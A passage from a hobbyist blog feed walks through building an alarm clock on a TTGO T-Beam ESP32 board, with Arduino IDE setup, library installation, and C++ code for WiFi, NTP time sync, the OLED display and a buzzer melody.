timeClient.getFormattedTime(); int epochTime = timeClient.getEpochTime(); setTime(epochTime); Serial.println(formattedDate); // Extract date int splitT = formattedDate.indexOf(\u0026#34;T\u0026#34;); dayStamp = formattedDate.substring(0,splitT); display.drawString(0, 0, \u0026#34;TIME: \u0026#34; + dayStamp); display.display(); // save some power WiFi.mode(WIFI_OFF); } void loop() { // clear the screen and update the time display.clear(); display.setFont(ArialMT_Plain_16); display.drawString(0,0, String(hour()) + \u0026#34;:\u0026#34; + twoDigits(minute()) + \u0026#34;:\u0026#34; + twoDigits(second())); display.display(); // The alarm. This is for 6:25 am. 1430 for 2:30 pm if (String(hour()) + String(minute()) == \u0026#34;625\u0026#34;) { playMelody(); } // update the time every so often. In milliseconds delay(1000); } // contains note definitions so you don\u0026#39;t need to know specific frequencies. Just a bit of music theory #define NOTE_B0 31 #define NOTE_C1 33 #define NOTE_CS1 35 #define NOTE_D1 37 #define NOTE_DS1 39 #define NOTE_E1 41 #define NOTE_F1 44 #define NOTE_FS1 46 #define NOTE_G1 49 #define NOTE_GS1 52 #define NOTE_A1 55 #define NOTE_AS1 58 #define NOTE_B1 62 #define NOTE_C2 65 #define NOTE_CS2 69 #define NOTE_D2 73 #define NOTE_DS2 78 #define NOTE_E2 82 #define NOTE_F2 87 #define NOTE_FS2 93 #define NOTE_G2 98 #define NOTE_GS2 104 #define NOTE_A2 110 #define NOTE_AS2 117 #define NOTE_B2 123 #define NOTE_C3 131 #define NOTE_CS3 139 #define NOTE_D3 147 #define NOTE_DS3 156 #define NOTE_E3 165 #define NOTE_F3 175 #define NOTE_FS3 185 #define NOTE_G3 196 #define NOTE_GS3 208 #define NOTE_A3 220 #define NOTE_AS3 233 #define NOTE_B3 247 #define NOTE_C4 262 #define NOTE_CS4 277 #define NOTE_D4 294 #define NOTE_DS4 311 #define NOTE_E4 330 #define NOTE_F4 349 #define NOTE_FS4 370 #define NOTE_G4 392 #define NOTE_GS4 415 #define NOTE_A4 440 #define NOTE_AS4 466 #define NOTE_B4 494 #define NOTE_C5 523 #define NOTE_CS5 554 #define NOTE_D5 587 #define NOTE_DS5 622 #define NOTE_E5 659 #define NOTE_F5 698 #define NOTE_FS5 740 #define NOTE_G5 784 #define NOTE_GS5 831 #define NOTE_A5 880 #define NOTE_AS5 932 #define NOTE_B5 988 #define NOTE_C6 1047 #define NOTE_CS6 1109 #define NOTE_D6 1175 #define NOTE_DS6 1245 #define NOTE_E6 1319 #define NOTE_F6 1397 #define NOTE_FS6 1480 #define NOTE_G6 1568 #define NOTE_GS6 1661 #define NOTE_A6 1760 #define NOTE_AS6 1865 #define NOTE_B6 1976 #define NOTE_C7 2093 #define NOTE_CS7 2217 #define NOTE_D7 2349 #define NOTE_DS7 2489 #define NOTE_E7 2637 #define NOTE_F7 2794 #define NOTE_FS7 2960 #define NOTE_G7 3136 #define NOTE_GS7 3322 #define NOTE_A7 3520 #define NOTE_AS7 3729 #define NOTE_B7 3951 #define NOTE_C8 4186 #define NOTE_CS8 4435 #define NOTE_D8 4699 #define NOTE_DS8 4978 ",
      "content_html": "\u003ch2 id=\"introduction\"\u003eIntroduction \u003ca href=\"#introduction\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eSKIP if you just want the \u003cem\u003eHow to\u003c/em\u003e.\nMicrocontrollers can be fairly difficult to get into. For the most part, if I had any project, I would head straight for github and grab either some code to push through the Arduino IDE or something that could be flashed (with some more magical GUI software).\nThen, my friend shared with me a project called (Meshtastic)[https://meshtastic.org/] where, using a combination of LORA 915Mhz communication and GPS, you could have an open source device that would let you keep in touch with your party in the great outdoors (without wifi, LTE, or any other more stationary networking resource). I was amazed by what it could do, and I saw that there was just more software to be flashed. So I put in an order for two TTGO T-Beams and waited for them to come in from overseas.\nFinally they arrived\u0026hellip; but I ordered the wrong ones with no OLED screens. I could probably work with them without the screens, but I was there for an easy ride. So I ordered another 2 (at this point I\u0026rsquo;m pushing a hundred bucks for some side project I don\u0026rsquo;t know will even work).\nThose show up, I flash them and\u0026hellip;.. GPS does not connect. Needless to say, I did a bit of Googling but couldn\u0026rsquo;t find much, so they started to sit there.\nAnyway, I needed an alarm because I didn\u0026rsquo;t want an excuse to keep my phone near my bed (since it is the current alarm in use). That thing is an adult pacifier and probably the most appealing thing next to staring at the ceiling. So instead of buying\n\u003cimg src=\"/posts/T-Beam_Alarm_Clock/19319ca1ecebdab7b1d394774de2f5dc.png\" alt=\"19319ca1ecebdab7b1d394774de2f5dc.png\" loading=\"lazy\" /\u003e\n\u003c/p\u003e\n\u003cp\u003eI opted to at least make some use of the hundred dollars spent (wasted).\u003c/p\u003e\n\u003ch2 id=\"setup\"\u003eSetup \u003ca href=\"#setup\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eSo here are some prerequisites we will need before starting:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDrivers\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers\"\u003ehttps://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers\u003c/a\u003e for Windows and Mac. From Silabs. Guess we just have to trust it and click next on the install prompts very quickly so the viruses can\u0026rsquo;t multiply.\u003c/li\u003e\n\u003cli\u003eIf you\u0026rsquo;re running Linux, I imagine you already know what to do\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eArduino IDE \u003ca href=\"https://www.arduino.cc/en/software\"\u003ehttps://www.arduino.cc/en/software\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eVS Code (not required but it\u0026rsquo;s nice to have)\u003c/li\u003e\n\u003cli\u003eArduino Libraries\n\u003cul\u003e\n\u003cli\u003eESP8266 and ESP32 OLED driver for SSD1306 displays (yeah it\u0026rsquo;s a mouthful). This gets the little screen to work.\u003c/li\u003e\n\u003cli\u003eWiFi for the esp32 should be built in\u003c/li\u003e\n\u003cli\u003eNTPClient (so time isn\u0026rsquo;t completely off)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFirst download the driver and install it so your usb port can communicate with the UART channels on your board.\n\u003cimg src=\"/posts/T-Beam_Alarm_Clock/Screenshot_of_Install_CP210x_VCP_Driver.png\" alt=\"Screenshot_of_Install_CP210x_VCP_Driver.png\" loading=\"lazy\" /\u003e\n\nUnzip the downloaded file, double click on the dmg, double click on the driver installation app, and follow the on-screen prompts to install it.\u003c/p\u003e\n\u003cp\u003eOnce that is installed, also install the Arduino IDE if you haven\u0026rsquo;t already. Then open it up and you should be greeted with something like this\n\u003cimg src=\"/posts/T-Beam_Alarm_Clock/adc139963d398d86b12ac76d9fe7f7c8.png\" alt=\"adc139963d398d86b12ac76d9fe7f7c8.png\" loading=\"lazy\" /\u003e\n\nIf you\u0026rsquo;ve never used an Arduino board before, this is just some template code for the board. Anything in the {} after setup() will be run only once. Anything in between the {} after loop() will be run repeatedly\u0026hellip; like in a loop.\u003c/p\u003e\n\u003cp\u003eIn order to get the code onto the T-beam board, we will need to add the particular board type into our Arduino installation. To do this, first head to the preferences or settings for the IDE and look for the field called \u0026ldquo;Additional Boards Manager URLs\u0026rdquo;.\nAdd the following URL: \u003ca href=\"https://dl.espressif.com/dl/package_esp32_index.json\"\u003ehttps://dl.espressif.com/dl/package_esp32_index.json\u003c/a\u003e and open the Boards Manager.\u003c/p\u003e\n\u003cp\u003eSearch for the esp32 (by Espressif Systems) and install it.\nGo back to Tools -\u0026gt; Board -\u0026gt; ESP32 and select the T-Beam.\nNow, we have essentially configured everything we need to begin communicating with the T-Beam. You can plug in your T-Beam and begin coding and flashing code to your board. However, for more advanced functionality, it is likely that you would install libraries so you don\u0026rsquo;t need to learn how to write code to communicate with a specific OLED screen or how to communicate with a networking chip.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/posts/T-Beam_Alarm_Clock/Screenshot_of_Arduino.png\" alt=\"Screenshot_of_Arduino.png\" loading=\"lazy\" /\u003e\n\nUnder the Sketch tab, go to \u0026ldquo;Include Library\u0026rdquo; and select \u0026ldquo;Manage Libraries\u0026hellip;\u0026rdquo;\nThe first library we will install is Timelib so that managing time is easier.\n\u003cimg src=\"/posts/T-Beam_Alarm_Clock/3a9daaf1dbea6e8f5d5be8410e41aab8.png\" alt=\"3a9daaf1dbea6e8f5d5be8410e41aab8.png\" loading=\"lazy\" /\u003e\n\nGo to the search bar and search \u0026ldquo;time\u0026rdquo; or \u0026ldquo;timelib\u0026rdquo; until you find the library shown above. The install button will be in the bottom right if you haven\u0026rsquo;t already installed the library. Proceed to install all of the following libraries as well:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eesp8266 and esp32 OLED driver for ssd1306 displays: It\u0026rsquo;s a pretty self explanatory library name, but it basically makes it easier to use the small displays that are used on arduino boards. For example, you can print text to the screen or draw shapes to the screen.\u003c/li\u003e\n\u003cli\u003eNTPClient: Contains the code that allows the board to communicate using the network time protocol and get accurate, current time/date.\u003c/li\u003e\n\u003cli\u003eWiFi: Contains code to communicate with common WiFi protocols. Should be installed by default.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThat is all for the libraries we\u0026rsquo;ll be needing. Now here is the code. I will try to comment everything as clearly as possible. Otherwise it should just work once you change the wifi details to suit your access point.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-cpp\" data-lang=\"cpp\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026#34;SSD1306Wire.h\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;WiFi.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;NTPClient.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;TimeLib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026#34;pitches.h\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e \u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e// see pitches.h file below. It is another file in the same project\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// set wifi variables\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e ssid     \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SSID\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e password \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;PASSWORD\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// set the display\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eSSD1306Wire \u003cspan style=\"color:#a6e22e\"\u003edisplay\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x3c\u003c/span\u003e, SDA, SCL); \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Define NTP client to get time\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eWiFiUDP ntpUDP;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNTPClient \u003cspan style=\"color:#a6e22e\"\u003etimeClient\u003c/span\u003e(ntpUDP);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Variables to save date and time\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eString formattedDate;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eString dayStamp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eString timeStamp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// connect to WiFi function\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econnectToWiFi\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Serial.print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Connecting to WiFi\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// set wifi to station mode (client mode)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  WiFi.mode(WIFI_STA);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  WiFi.begin(ssid, password);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e attempt \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// while loop that adds a dot for each second that the status is not connected yet\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e(WiFi.status() \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e WL_CONNECTED){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Serial.print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.\u0026#34;\u003c/span\u003e); \u003cspan style=\"color:#75715e\"\u003e// print a dot to serial\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    display.drawString(attempt, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.\u0026#34;\u003c/span\u003e); \u003cspan style=\"color:#75715e\"\u003e// draw a dot next to the last one.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    display.display(); \u003cspan style=\"color:#75715e\"\u003e// refresh the display so what was drawn actually shows\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    attempt\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e// increase the attempt counter (acts as x axis for dots being printed)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    delay(\u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// utility function for digital clock display: prints leading 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eString \u003cspan style=\"color:#a6e22e\"\u003etwoDigits\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e digits){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(digits \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    String i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003eString(digits);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e i;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e String(digits);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// plays a tone from a particular pin for a set amount of time\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etone\u003c/span\u003e(byte pin, \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e freq, \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e length) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ledcSetup(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2000\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e); \u003cspan style=\"color:#75715e\"\u003e// setup beeper\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  ledcAttachPin(pin, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e); \u003cspan style=\"color:#75715e\"\u003e// attach beeper\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  ledcWriteTone(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, freq); \u003cspan style=\"color:#75715e\"\u003e// play tone\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  delay(length); \u003cspan style=\"color:#75715e\"\u003e// play for as long as specified\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  ledcWriteTone(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e); \u003cspan style=\"color:#75715e\"\u003e// then turn off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eplayMelody\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// notes in the melody:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e melody[] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    NOTE_C4, NOTE_G3, NOTE_G3, NOTE_A3, NOTE_G3, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, NOTE_B3, NOTE_C4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// note durations: 4 = quarter note, 8 = eighth note, etc.:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e noteDurations[] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// loop to play the melody specified\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e thisNote \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; thisNote \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(melody)\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(melody[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]); thisNote\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    tone(\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e, melody[thisNote], \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003enoteDurations[thisNote]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esetup\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// set the baud rate and print newlines to serial\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  Serial.begin(\u003cspan style=\"color:#ae81ff\"\u003e9600\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Serial.println();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Serial.println();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan 